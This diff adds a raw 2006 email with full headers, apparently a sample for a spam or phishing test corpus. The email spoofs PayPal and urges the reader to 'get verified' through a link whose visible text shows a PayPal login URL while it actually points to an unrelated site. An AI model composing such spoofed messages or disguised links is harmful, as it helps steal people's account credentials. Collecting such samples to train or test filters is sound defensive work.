@@ -1,0 +1,154 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id B246D2A895
+ for <user@example.com>; Tue, 17 Jan 2006 03:54:14 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 98847621C95; Tue, 17 Jan 2006 03:54:14 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 77431621C71
+ for <user@example.com>; Tue, 17 Jan 2006 03:54:14 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id DAA02841
+ for user@example.com; Tue, 17 Jan 2006 03:54:14 -0500
+Received: from platinum.nocdirect.com (platinum.nocdirect.com [69.73.166.108])
+ by mail.example.com with ESMTP id DAA02833
+ for <user@example.com>; Tue, 17 Jan 2006 03:54:13 -0500
+Message-Id: <200601170854.DAA02833@mail.example.com>
+Received: from 12-210-160-223.client.insightbb.com ([12.210.160.223] helo=User)
+ by platinum.nocdirect.com with esmtpa (Exim 4.52)
+ id 1EymWN-0007n1-HR; Tue, 17 Jan 2006 02:48:58 -0600
+Reply-To: <no.reply@paypal.com>
+From: "PayPal" <aw-confirm@paypal.com>
+Subject: Account compromised: billing information moved or changed
+Date: Tue, 17 Jan 2006 10:48:51 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - platinum.nocdirect.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [0 0] / [47 12]
+X-AntiAbuse: Sender Address Domain - paypal.com
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 274
+
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; 
+background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align="center" width="70%" border=0>
+<tr>
+<td align="left"><img 
+src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0></td>
+</tr>
+<tr>
+<td> </td>
+</tr>
+<TR>
+<TD><b>LEGAL NOTICE</b></TD>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class="panel"><b>Message sent to you follows:</b></TD>
+</TR>
+<TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD></TR>
+<TR>
+	<TD><font color="Navy" size="3"><b>Dear PayPal 
+client,</b></font><br>
+	<br>
+	      <font face="Arial" size="2px">Did you know that Unverified 
+PayPal members have a Sending Limit?<br>
+
+	<br>
+You can send unlimited payments when you become Verified. It's easy! <br>
+
+<br>As a security measure, PayPal asks members to add and confirm 
+ownership of a bank account. When you confirm your bank account, you 
+become 
+Verified.
+<br>
+<br>
+This process is a secure and easy way to confirm a member's identity 
+and leads to safer transactions between buyers and sellers.
+ <br>
+<br>
+ Become Verified and help increase the security of your PayPal 
+transactions for yourself and for everyone with whom you do business. 
+<br>
+<br>
+You can also:
+ <br>
+
+<br>   - Fund purchases directly from your checking or savings account, 
+in addition to using credit cards<br>
+
+<br>     - Shop without interruption because Verified users have no 
+Sending Limit <br>
+
+<br>     - Improve your reputation by letting others know you're a 
+confirmed, Verified member of the PayPal community<br>
+<br>     - Send money to friends, family, and PayPal Personal Account 
+holders<br>
+<br>
+ <br>
+ <br>
+ Get Verified Now!<br>
+
+
+<br> Click the link below:  <a  
+href="http://www.labs.cl/update.html" 
+title="https://www.paypal.com/cgi-bin/webscr?cmd=_login">https://www.paypal.com/cgi-bin/webscr?cmd=_login</a> 
+to get verified <br>
+
+
+<br>
+Thank you for using PayPal!
+<br> 
+The PayPal Team
+ <br>
+ 
+ 
+<br>
+Please do not reply to this email. This mailbox is not monitored and 
+you will not receive a response. For assistance, log in to your PayPal 
+account and click the Help link located in the top right corner of any 
+PayPal page.
+ <br>
+ <br>
+ <br>
+ <br>
+ PayPal Email ID PP247
+<br>
+        <br>
+        <br>
+	<br>
+        <br>
+	<b>Best regards</b>,<br>
+	- <i>PayPal Team</i>.
+        </TD>
+        </tr>
+</TABLE>
